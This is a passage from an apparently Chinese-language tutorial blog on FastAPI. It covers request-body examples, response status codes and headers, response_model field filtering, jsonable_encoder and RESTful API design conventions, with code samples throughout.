class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span> = Field(example=<span class="hljs-string">&quot;Foo&quot;</span>)<br>    description: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>] = Field(default=<span class="hljs-literal">None</span>, example=<span class="hljs-string">&quot;A very nice Item&quot;</span>)<br>    price: <span class="hljs-built_in">float</span> = Field(example=<span class="hljs-number">35.4</span>)<br>    tax: <span class="hljs-type">Union</span>[<span class="hljs-built_in">float</span>, <span class="hljs-literal">None</span>] = Field(default=<span class="hljs-literal">None</span>, example=<span class="hljs-number">3.2</span>)<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: Item</span>):<br>    <span class="hljs-keyword">return</span> item<br><br></code></pre></td></tr></table></figure><p>示例3：使用 <code>Body(example=&quot;一个例子&quot;, examples=&quot;多组例子&quot;)</code>，这种方式也适用：<code>Path\Query\Header</code>等等 【不常用】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Body, FastAPI<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel<br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br>    description: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>] = <span class="hljs-literal">None</span><br>    price: <span class="hljs-built_in">float</span><br>    tax: <span class="hljs-type">Union</span>[<span class="hljs-built_in">float</span>, <span class="hljs-literal">None</span>] = <span class="hljs-literal">None</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params"></span><br><span class="hljs-params">    *,</span><br><span class="hljs-params">    item: Item = Body(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-params">        examples=&#123;</span></span><br><span class="hljs-params"><span class="hljs-params">            <span class="hljs-string">&quot;normal&quot;</span>: &#123;</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;summary&quot;</span>: <span class="hljs-string">&quot;A normal example&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;A **normal** item works correctly.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;value&quot;</span>: &#123;</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Foo&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;A very nice Item&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">35.4</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;tax&quot;</span>: <span class="hljs-number">3.2</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                &#125;,</span></span><br><span class="hljs-params"><span class="hljs-params">            &#125;,</span></span><br><span class="hljs-params"><span class="hljs-params">            <span class="hljs-string">&quot;converted&quot;</span>: &#123;</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;summary&quot;</span>: <span class="hljs-string">&quot;An example with converted data&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;FastAPI can convert price `strings` to actual `numbers` automatically&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;value&quot;</span>: &#123;</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Bar&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-string">&quot;35.4&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                &#125;,</span></span><br><span class="hljs-params"><span class="hljs-params">            &#125;,</span></span><br><span class="hljs-params"><span class="hljs-params">            <span class="hljs-string">&quot;invalid&quot;</span>: &#123;</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;summary&quot;</span>: <span class="hljs-string">&quot;Invalid data is rejected with an error&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                <span class="hljs-string">&quot;value&quot;</span>: &#123;</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Baz&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                    <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-string">&quot;thirty five point four&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-params">                &#125;,</span></span><br><span class="hljs-params"><span class="hljs-params">            &#125;,</span></span><br><span class="hljs-params"><span class="hljs-params">        &#125;,</span></span><br><span class="hljs-params"><span class="hljs-params">    </span>),</span><br><span class="hljs-params"></span>):<br>    <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><h1 id="本章学习总结，"><a href="#本章学习总结，" class="headerlink" title="本章学习总结，"></a>本章学习总结，</h1><ul><li><p>主要是在与对请求头Header()和请求体Body()的定义</p></li><li><p>这里的<code>Header</code>的定义只是一个简单的定义，还没有注入依赖项（token令牌等）</p></li><li><p>请求体的话主要使用<code>Pydantic</code>模型类BoseModel定义,在路径函数上做类型提示更方便</p></li></ul><h1 id="4-1-设置响应状态码"><a href="#4-1-设置响应状态码" class="headerlink" title="4-1 设置响应状态码"></a>4-1 设置响应状态码</h1><p>示例1：<strong>直接给status_code字段一个状态码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, status_code=<span class="hljs-number">200</span></span>)</span><span class="hljs-comment"># 直接指定一个响应码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">user: User</span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: user.username,<br>        <span class="hljs-string">&quot;password&quot;</span>: user.password<br>    &#125;<br></code></pre></td></tr></table></figure><p>示例3：<strong>status_code使用常量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Path, Header,status<br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, status_code=status.HTTP_200_OK</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h1 id="4-2-设置响应头"><a href="#4-2-设置响应头" class="headerlink" title="4-2 设置响应头"></a>4-2 设置响应头</h1><p>有的时候，在响应客户端请求的时候，需要在响应头中给客户端返回一些数据，此时该如何设置响应头呢？</p><p>示例1：在路径函数中使用 <code>Response</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Response<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">response: Response</span>):<br>    response.headers[<span class="hljs-string">&quot;x-jwt-token&quot;</span>] = <span class="hljs-string">&quot;this_is_jwt_token&quot;</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello World&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>示例2：直接使用返回一个<code>Response</code>，比如使用FastAPI的默认响应方式JSONResponse</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> JSONResponse<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    response = JSONResponse(<br>        content=&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello World&quot;</span>&#125;,<br>        headers=&#123;<span class="hljs-string">&quot;x-jwt-token&quot;</span>: <span class="hljs-string">&quot;this_is_jwt_token&quot;</span>&#125;,<br>    )<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>扩展：使用返回Response的方式，也可以设置响应状态码，手动设置响应体，操作cookie等等</p><h1 id="4-3-响应体数据"><a href="#4-3-响应体数据" class="headerlink" title="4-3 响应体数据"></a>4-3 响应体数据</h1><p>FastAPI响应数据时，默认响应是json的格式，具体使用的响应类是 <code>JSONResponse</code></p><p>举两个响应示例：一个<code>Pydantic</code>模型类，一个<code>Response</code>对象或 <code>Response</code>的子类</p><p>示例3：响应 基于Pydantic的模型类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> JSONResponse<br><br>app = FastAPI(default_response_class=JSONResponse) <span class="hljs-comment"># 默认响应类JSONResponse</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    username: <span class="hljs-built_in">str</span><br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">user: User</span>):<br>    <span class="hljs-keyword">return</span> user<br></code></pre></td></tr></table></figure><p>示例4：直接响应一个 <code>Response</code>对象或 <code>Response</code>的子类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Response<br><span class="hljs-keyword">import</span> json<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>():<br>    response = Response(<br>        content=json.dumps([&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;图书<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]),<br>        media_type=<span class="hljs-string">&quot;application/json&quot;</span><br>    )<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><h1 id="4-4-使用响应模型response-model"><a href="#4-4-使用响应模型response-model" class="headerlink" title="4-4 使用响应模型response_model"></a>4-4 使用响应模型response_model</h1><p><strong>需求场景</strong></p><ul><li>需求1：用户注册接口（需要用户名和密码），后端完成注册后一般会将用户信息返回，但此时不能返回用户密码，该如何操作？</li><li>需求2：想让接口返回的字段按照一定的规范来，有数据格式校验和转换等功能，该怎么办？</li><li>需求3：API文档展示响应字段和类型</li></ul><p>FastAPI提供了<strong>响应模型</strong>（<code>response_model</code>）的概念，就像定义模型类用来接收请求体数据，响应模型用来处理响应数据。</p><p>利用响应模型，可以实现返回字段的动态过滤，类型校验和类型转换等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    username: <span class="hljs-built_in">str</span><br>    password: <span class="hljs-built_in">str</span><br>    email: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserOut</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    username: <span class="hljs-built_in">str</span><br>    email: <span class="hljs-built_in">str</span><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/registe&quot;</span>, response_model=UserOut</span>)</span><span class="hljs-comment"># 指定了响应模型是UserOut，则只返回username和email两个字段 过滤掉了</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">registe</span>(<span class="hljs-params">user: User</span>):<br>    <span class="hljs-keyword">return</span> user<br></code></pre></td></tr></table></figure><p>示例3：使用response_model做类型校验和类型转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/demo&quot;</span>, response_model=typing.<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">int</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>&#125;<span class="hljs-comment"># 像一个数据的值，会自动转换为Int类型 这里就做了强制的类型转换</span><br></code></pre></td></tr></table></figure><h1 id="4-5-用于过滤响应数据的五个参数"><a href="#4-5-用于过滤响应数据的五个参数" class="headerlink" title="4-5 用于过滤响应数据的五个参数"></a>4-5 用于过滤响应数据的五个参数</h1><p>很多时候，我们需要对响应模型中的某些字段做一个过滤操作，比如，</p><ul><li>没有赋值的字段过滤掉</li><li>使用默认值的字段过滤掉</li><li>指定某些字段过滤掉</li><li>保留指定的字段等等</li></ul><p>FastAPI提供了5个配合响应模型一块使用的字段：</p><ul><li>response_model_include，只展示选中的字段</li><li>response_model_exclude，选中的字段不展示</li><li>response_model_exclude_unset，过滤掉没有赋值的字段</li><li>response_model_exclude_defaults，过滤掉使用默认值的字段</li><li>response_model_exclude_none，排序没有值的字段</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;/items/&#123;name&#125;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    response_model=Item,</span></span><br><span class="hljs-params"><span class="hljs-meta">    response_model_include=&#123;<span class="hljs-string">&quot;name&quot;</span>&#125;, <span class="hljs-comment"># 只展示选中的</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    response_model_exclude=&#123;<span class="hljs-string">&quot;tax&quot;</span>&#125;, <span class="hljs-comment"># 选中的不展示的</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    response_model_exclude_unset=<span class="hljs-literal">True</span>, <span class="hljs-comment"># 过滤，过滤掉没有赋值的字段</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    response_model_exclude_defaults=<span class="hljs-literal">True</span>, <span class="hljs-comment"># 过滤，过滤掉使用了默认值得字段</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    response_model_exclude_none=<span class="hljs-literal">True</span>, <span class="hljs-comment"># 排序，排序没有值的字段</span></span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_item_name</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">return</span> items[name]<br></code></pre></td></tr></table></figure><h1 id="4-6-Pydantic模型类对象的dict方法"><a href="#4-6-Pydantic模型类对象的dict方法" class="headerlink" title="4-6 Pydantic模型类对象的dict方法"></a>4-6 Pydantic模型类对象的dict方法</h1><p>这个方法好像弃用了</p><h1 id="4-7-jsonable-encoder【可能是重点】"><a href="#4-7-jsonable-encoder【可能是重点】" class="headerlink" title="4-7 jsonable_encoder【可能是重点】"></a>4-7 jsonable_encoder【可能是重点】</h1><p>客户端向服务端提交的数据需要永久存储保存数据库，那么此时就需要保证数据都是可序列化的，如何保证待序列化的数据都是可序列化的呢?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.encoders <span class="hljs-keyword">import</span> jsonable_encoder<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel<br><br>fake_db = &#123;&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    title: <span class="hljs-built_in">str</span><br>    timestamp: datetime<br>    description: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>] = <span class="hljs-literal">None</span><br><br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: Item</span>):<br>    json_compatible_item_data = jsonable_encoder(item) <span class="hljs-comment"># 转化json可序列化</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(json_compatible_item_data))<br>    <span class="hljs-built_in">print</span>(json_compatible_item_data)<br>    json.dumps(json_compatible_item_data)<br>    <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><h1 id="4-8-响应部分总结"><a href="#4-8-响应部分总结" class="headerlink" title="4-8 响应部分总结"></a>4-8 响应部分总结</h1><ul><li><p>如何设置状态码：statuc_code、Response及其子类</p></li><li><p>如何设置响应头：Response及其子类</p></li><li><p>如何设置响应体：默认响应类是JSONResponse，也可以手动返回Response及其子类的对象</p></li><li><p>使用响应模型做字段过滤</p></li><li><p>关于不同类型的响应（下载文件等）在11章响应介绍</p></li></ul><h1 id="5-、阶段性总结"><a href="#5-、阶段性总结" class="headerlink" title="5 、阶段性总结"></a>5 、阶段性总结</h1><h2 id="关于博客的增删改查练习"><a href="#关于博客的增删改查练习" class="headerlink" title="关于博客的增删改查练习"></a>关于博客的增删改查练习</h2><ul><li><p>5个请求方式的使用规范</p></li><li><p>错误处理</p></li><li><p>Restful风格api设计</p><blockquote><p>RESTful是Web API接口的设计规范风格，这种风格的理念认为后端开发任务就是提供数据的，对外提供的是数据资源的访问接口，尤其适用于前后端分离的应用模式中。所以在定义接口时，客户端访问的URL路径就表示这种要操作的数据资源。</p><p>任何一个框架都可以实现符合restful规范的API接口。</p><p>RESTful十条规范：</p><p>1 数据的安全保障：url链接一般都采用https协议进行传输 </p><p>2 接口特征表现，一看就知道是个api接口</p><ul><li>用api关键字标识接口url：<a href="https://www.baidu.com/api">https://www.baidu.com/api</a></li></ul><p>3 多数据版本共存，在url链接中标识数据版本</p><ul><li><a href="https://api.baidu.com/v1">https://api.baidu.com/v1</a></li><li><a href="https://api.baidu.com/v2">https://api.baidu.com/v2</a></li></ul><p>!!!4 数据即是资源，均使用名词（可复数）</p><ul><li>接口一般都是完成前后台数据的交互，交互的数据我们称之为资源</li><li><a href="https://api.baidu.com/users">https://api.baidu.com/users</a><br> 注：一般提倡用资源的复数形式，在url链接中奖励不要出现操作资源的动词</li><li>特殊的接口可以出现动词，因为这些接口一般没有一个明确的资源，或是动词就是接口的核心含义</li><li><a href="https://api.baidu.com/place/search">https://api.baidu.com/place/search</a></li><li><a href="https://api.baidu.com/login">https://api.baidu.com/login</a></li></ul><p>!!!5 资源操作由请求方式决定（method）</p><ul><li>操作资源一般都会涉及到增删改查，使用请求方式确定操作类型<ul><li><a href="https://api.baidu.com/books">https://api.baidu.com/books</a> - get请求：获取所有书</li><li><a href="https://api.baidu.com/books/1">https://api.baidu.com/books/1</a> - get请求：获取主键为1的书</li><li><a href="https://api.baidu.com/books">https://api.baidu.com/books</a> - post请求：新增一本书书</li><li><a href="https://api.baidu.com/books/1">https://api.baidu.com/books/1</a> - put请求：整体修改主键为1的书</li><li><a href="https://api.baidu.com/books/1">https://api.baidu.com/books/1</a> - patch请求：局部修改主键为1的书</li><li><a href="https://api.baidu.com/books/1">https://api.baidu.com/books/1</a> - delete请求：删除主键为1的书</li></ul></li></ul><p>6 过滤，通过在url上传参的形式传递搜索条件，或者说查询参数(query_params)</p><ul><li><a href="https://api.example.com/v1/zoos?limit=10%EF%BC%9A%E6%8C%87%E5%AE%9A%E8%BF%94%E5%9B%9E%E8%AE%B0%E5%BD%95%E7%9A%84%E6%95%B0%E9%87%8F">https://api.example.com/v1/zoos?limit=10：指定返回记录的数量</a></li><li><a href="https://api.example.com/v1/zoos?offset=10%EF%BC%9A%E6%8C%87%E5%AE%9A%E8%BF%94%E5%9B%9E%E8%AE%B0%E5%BD%95%E7%9A%84%E5%BC%80%E5%A7%8B%E4%BD%8D%E7%BD%AE">https://api.example.com/v1/zoos?offset=10：指定返回记录的开始位置</a></li><li><a href="https://api.example.com/v1/zoos?page=2&per_page=100%EF%BC%9A%E6%8C%87%E5%AE%9A%E7%AC%AC%E5%87%A0%E9%A1%B5%EF%BC%8C%E4%BB%A5%E5%8F%8A%E6%AF%8F%E9%A1%B5%E7%9A%84%E8%AE%B0%E5%BD%95%E6%95%B0">https://api.example.com/v1/zoos?page=2&amp;per_page=100：指定第几页，以及每页的记录数</a></li><li><a href="https://api.example.com/v1/zoos?sortby=name&order=asc%EF%BC%9A%E6%8C%87%E5%AE%9A%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E6%8C%89%E7%85%A7%E5%93%AA%E4%B8%AA%E5%B1%9E%E6%80%A7%E6%8E%92%E5%BA%8F%EF%BC%8C%E4%BB%A5%E5%8F%8A%E6%8E%92%E5%BA%8F%E9%A1%BA%E5%BA%8F">https://api.example.com/v1/zoos?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序</a></li><li><a href="https://api.example.com/v1/zoos?animal_type_id=1%EF%BC%9A%E6%8C%87%E5%AE%9A%E7%AD%9B%E9%80%89%E6%9D%A1%E4%BB%B6">https://api.example.com/v1/zoos?animal_type_id=1：指定筛选条件</a></li></ul><p>7 响应状态码</p><p>8 错误处理<br>9 返回结果，针对不同操作，服务器向用户返回的结果应该符合以下规范<br>  GET &#x2F;collection：返回资源对象的列表（数组）<br>  GET &#x2F;collection&#x2F;resource：返回单个资源对象<br>  POST &#x2F;collection：返回新生成的资源对象<br>  PUT &#x2F;collection&#x2F;resource：返回完整的资源对象<br>  PATCH &#x2F;collection&#x2F;resource：返回完整的资源对象<br>  DELETE &#x2F;collection&#x2F;resource：返回一个空文档<br>10 需要url请求的资源需要访问资源的请求链接</p><ul><li>Hypermedia API，RESTful API最好做到Hypermedia，</li><li>即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"> &gt;<span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ok&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;results&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;肯德基(罗餐厅)&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;img&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://image.baidu.com/kfc/001.png&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br> &gt;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></blockquote></li></ul><p>源码示例：模拟RESTFul风格的api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 